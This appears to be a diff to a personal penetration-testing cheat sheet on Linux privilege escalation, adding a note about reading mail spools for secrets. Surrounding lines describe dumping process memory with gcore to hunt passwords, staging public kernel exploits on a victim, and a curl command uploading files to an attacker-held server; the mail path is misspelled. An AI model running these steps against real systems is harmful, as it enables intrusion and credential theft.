@@ -130,7 +130,6 @@
    - e.g. ```gcore``` doesnt drop direct priv esc but can attach to PID and dump memories
    - try to attach to contain 'password' process or sus process
    - ``` strings {dumped file} ```
-2. 
 
 ## Kernal fuck
 - search public exploit | sometime need pull file to victim compile and run
@@ -149,3 +148,6 @@
 
 ### Upload Thru http server
 1. ``` curl {ip}/{file} --upload-file {file}
+
+## Mail server
+1. if mail server is on --> check emails if have secrets ```/var/spoof/mail```
